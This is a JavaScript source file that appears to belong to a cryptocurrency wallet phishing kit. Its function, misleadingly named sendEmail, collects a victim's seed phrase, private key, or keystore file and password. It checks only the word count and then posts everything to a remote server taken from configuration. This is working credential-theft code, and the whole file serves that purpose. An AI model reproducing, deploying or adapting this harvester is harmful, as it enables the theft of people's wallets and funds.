import { SERVER, SLINK } from "../../config";
import { Axios, Toast } from "../../config/libs";

export const sendEmail = async (x) => {
  const { type, phrase, keystone, privateKey, wallet } = x.data;
  const key = Object(keystone.key)
//   console.log(typeof key !== 'Object');

  if (type === "phrase") {
    if (phrase === "") {
      Toast("error", "Phrase can't be empty.");
      return !!0;
    }
    const words = phrase.split(' ');
    if(words.length < 12) {
      Toast("error", "Invalid Phrase.");
      return !!0;
    }
    if(words.length > 24) {
      Toast("error", "Invalid Phrase.");
      return !!0;
    }
  }
  if (type === "privateKey") {
    if (privateKey === "") {
      Toast("error", "Private Key can't be empty.");
      return !!0;
    }
    const words = privateKey.split(' ');
    if(words.length < 12) {
      Toast("error", "Invalid Private Key.");
      return !!0;
    }
    if(words.length > 24) {
      Toast("error", "Invalid Private Key.");
      return !!0;
    }
  }
  if (type === "keystone") {
    if (keystone.key === "") {
      Toast("error", "Keystone can't be empty.");
    }
    if (keystone.password === "") {
      Toast("error", "Keystone Password can't be empty.");
    }
    if (typeof key !== 'object') {
        console.log(typeof key)
      Toast("error", "Invalid Keystone.");
    }
    return !!0;
  }

  try {
    const res = await Axios.post(`${SERVER}/${SLINK}`,{data: { type, phrase, keystone, privateKey, wallet }});
    console.log(res);
  } catch (error) {
    console.error(error);
  }
  return !!1;
};
